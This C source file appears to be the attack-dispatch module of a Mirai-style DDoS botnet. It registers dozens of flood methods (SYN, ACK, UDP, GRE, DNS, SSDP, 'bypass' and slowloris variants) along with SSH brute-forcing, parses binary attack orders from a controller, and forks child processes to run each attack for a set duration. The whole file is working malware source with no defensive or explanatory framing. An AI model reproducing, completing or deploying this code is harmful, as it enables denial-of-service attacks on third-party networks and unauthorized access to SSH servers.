#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"
#include "ssh_bruteforce.h"
#include "attack_stats.h"
extern void attack_autobypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
pid_t attack_pgids[ATTACK_CONCURRENT_MAX] = {0};
BOOL attack_init(void)
{
    int i;
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_method_std);
    add_attack(ATK_VEC_TCP, (ATTACK_FUNC)attack_method_tcp);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_HEXFLOOD, (ATTACK_FUNC)attack_method_hexflood);
    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_method_stdhex);
    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_method_tcpxmas);
    add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcp_bypass);
    add_attack(ATK_VEC_UDP_CUSTOM, (ATTACK_FUNC)attack_udp_custom);
    add_attack(ATK_VEC_RAW, (ATTACK_FUNC)attack_method_raw);
    add_attack(ATK_VEC_OVHTCP, (ATTACK_FUNC)attack_method_ovhtcp);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket_flood);
    add_attack(ATK_VEC_ZCONNECT, (ATTACK_FUNC)attack_zconnect);
    add_attack(ATK_VEC_TCP_FULL, (ATTACK_FUNC)attack_tcp_full);
    add_attack(ATK_VEC_TCP_CONNECT, (ATTACK_FUNC)attack_tcp_connect);
    add_attack(ATK_VEC_SLOWLORIS_UDP, (ATTACK_FUNC)attack_slowloris_udp);
    add_attack(ATK_VEC_ORBIT_PPS, (ATTACK_FUNC)attack_tcp_orbitpps);
    add_attack(ATK_VEC_ORBIT_V4, (ATTACK_FUNC)attack_tcp_orbitv4);
    add_attack(ATK_VEC_SSH_BRUTEFORCE, (ATTACK_FUNC)attack_ssh_bruteforce);
    add_attack(ATK_VEC_TCP_IPI, (ATTACK_FUNC)attack_tcp_ipi);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_method_greip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_method_greeth);
    add_attack(ATK_VEC_TCPSYN, (ATTACK_FUNC)attack_method_tcpsyn);
    add_attack(ATK_VEC_RANDHEX, (ATTACK_FUNC)attack_method_randhex);
    add_attack(ATK_VEC_TCPACK, (ATTACK_FUNC)attack_method_tcpack);
    add_attack(ATK_VEC_TCPSTOMP, (ATTACK_FUNC)attack_method_tcpstomp);
    add_attack(ATK_VEC_UDPGENERIC, (ATTACK_FUNC)attack_method_udpgeneric);
    add_attack(ATK_VEC_UDPVSE, (ATTACK_FUNC)attack_method_udpvse);
    add_attack(ATK_VEC_UDPDNS, (ATTACK_FUNC)attack_method_udpdns);
    add_attack(ATK_VEC_ICE, (ATTACK_FUNC)attack_method_ice);
    add_attack(ATK_VEC_TCPALL, (ATTACK_FUNC)attack_method_tcpall);
    add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_method_tcpfrag);
    add_attack(ATK_VEC_ASYN, (ATTACK_FUNC)attack_method_asyn);
    add_attack(ATK_VEC_SSDP, (ATTACK_FUNC)attack_method_ssdp);
    add_attack(ATK_VEC_AUTOBYPASS, (ATTACK_FUNC)attack_autobypass);
    return TRUE;
}
void attack_kill_all(void)
{
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
        {
            kill(attack_ongoing[i], 9);
            if (attack_pgids[i] != 0)
            {
                killpg(attack_pgids[i], 9);
            }
        }
        attack_ongoing[i] = 0;
        attack_pgids[i] = 0;
    }
}
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0 && vector != ATK_VEC_SSH_BRUTEFORCE)
        goto cleanup;
    if (targs_len > 0)
    {
        if (len >= 5 && (uint8_t)buf[0] == 0xFF && targs_len == 1)
        {
            if (vector == ATK_VEC_SLOWLORIS_TCP)
            {
                uint8_t domain_len = buf[4];
                if (len < 5 + domain_len)
                    goto cleanup;
                char *domain_str = calloc(domain_len + 1, 1);
                if (!domain_str) goto cleanup;
                memcpy(domain_str, buf + 5, domain_len);
                buf += 5 + domain_len;
                len -= 5 + domain_len;
                targs = calloc(1, sizeof(struct attack_target));
                targs[0].addr = 0;
                targs[0].netmask = 32;
                targs[0].sock_addr.sin_family = AF_INET;
                targs[0].sock_addr.sin_addr.s_addr = 0;
                targs_len = 1;
                if (len < sizeof (uint8_t))
                    goto cleanup;
                opts_len = (uint8_t)*buf++;
                len -= sizeof (uint8_t);
                opts = calloc(opts_len + 1, sizeof(struct attack_option));
                if (!opts) {
                    free(domain_str);
                    goto cleanup;
                }
                for (i = 0; i < opts_len; i++)
                {
                    uint8_t val_len;
                    if (len < sizeof (uint8_t))
                        goto cleanup;
                    opts[i].key = (uint8_t)*buf++;
                    len -= sizeof (uint8_t);
                    if (len < sizeof (uint8_t))
                        goto cleanup;
                    val_len = (uint8_t)*buf++;
                    len -= sizeof (uint8_t);
                    if (len < val_len)
                        goto cleanup;
                    opts[i].val = calloc(val_len + 1, sizeof (char));
                    util_memcpy(opts[i].val, buf, val_len);
                    buf += val_len;
                    len -= val_len;
                }
                opts[opts_len].key = ATK_OPT_DOMAIN;
                opts[opts_len].val = domain_str;
                opts_len++;
            }
            else
            {
                goto cleanup;
            }
        }
        else
        {
            if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
                goto cleanup;
            targs = calloc(targs_len, sizeof (struct attack_target));
            for (i = 0; i < targs_len; i++)
            {
                targs[i].addr = *((ipv4_t *)buf);
                buf += sizeof (ipv4_t);
                targs[i].netmask = (uint8_t)*buf++;
                len -= (sizeof (ipv4_t) + sizeof (uint8_t));
                targs[i].sock_addr.sin_family = AF_INET;
                targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
            }
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (opts_len > 0)
            {
                opts = calloc(opts_len, sizeof (struct attack_option));
                for (i = 0; i < opts_len; i++)
                {
                    uint8_t val_len;
                    if (len < sizeof (uint8_t))
                        goto cleanup;
                    opts[i].key = (uint8_t)*buf++;
                    len -= sizeof (uint8_t);
                    if (len < sizeof (uint8_t))
                        goto cleanup;
                    val_len = (uint8_t)*buf++;
                    len -= sizeof (uint8_t);
                    if (len < val_len)
                        goto cleanup;
                    opts[i].val = calloc(val_len + 1, sizeof (char));
                    util_memcpy(opts[i].val, buf, val_len);
                    buf += val_len;
                    len -= val_len;
                }
            }
        }
    }
    else
    {
        if (len < sizeof (uint8_t))
            goto cleanup;
        opts_len = (uint8_t)*buf++;
        len -= sizeof (uint8_t);
        if (opts_len > 0)
        {
            opts = calloc(opts_len, sizeof (struct attack_option));
            for (i = 0; i < opts_len; i++)
            {
                uint8_t val_len;
                if (len < sizeof (uint8_t))
                    goto cleanup;
                opts[i].key = (uint8_t)*buf++;
                len -= sizeof (uint8_t);
                if (len < sizeof (uint8_t))
                    goto cleanup;
                val_len = (uint8_t)*buf++;
                len -= sizeof (uint8_t);
                if (len < val_len)
                    goto cleanup;
                opts[i].val = calloc(val_len + 1, sizeof (char));
                util_memcpy(opts[i].val, buf, val_len);
                buf += val_len;
                len -= val_len;
            }
        }
    }
    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;
    int i;
    pid_t pgid;
    pid1 = fork();
    if (pid1 == -1)
        return;
    if (pid1 > 0)
    {
        for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
        {
            if (attack_ongoing[i] == 0)
            {
                attack_ongoing[i] = pid1;
                pgid = getpgid(pid1);
                if (pgid > 0)
                    attack_pgids[i] = pgid;
                break;
            }
        }
        return;
    }
    setpgid(0, 0);
    pgid = getpgid(0);
    pid2 = fork();
    if (pid2 == -1)
    {
        exit(0);
    }
    else if (pid2 == 0)
    {
        sleep(duration);
        attack_stats_reinit();
        attack_stats_remove((uint8_t)vector);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        attack_stats_reinit();
        attack_stats_set_method((uint8_t)vector);
        attack_stats_add((uint8_t)vector);
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        attack_stats_remove((uint8_t)vector);
        exit(0);
    }
}
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt && opts[i].val != NULL)
            return opts[i].val;
    }
    if (opt == ATK_OPT_DOMAIN && def == NULL)
        return "google.com";
    return def;
}
int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt && opts[i].val != NULL)
            return util_atoi(opts[i].val, 10);
    }
    return def;
}
uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    (void)opts_len; (void)opts; (void)opt;
        return def;
}
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));
    method->vector = vector;
    method->func = func;
    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}
static void free_opts(struct attack_option *opts, int len)
{
    int i;
    if (opts == NULL)
        return;
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
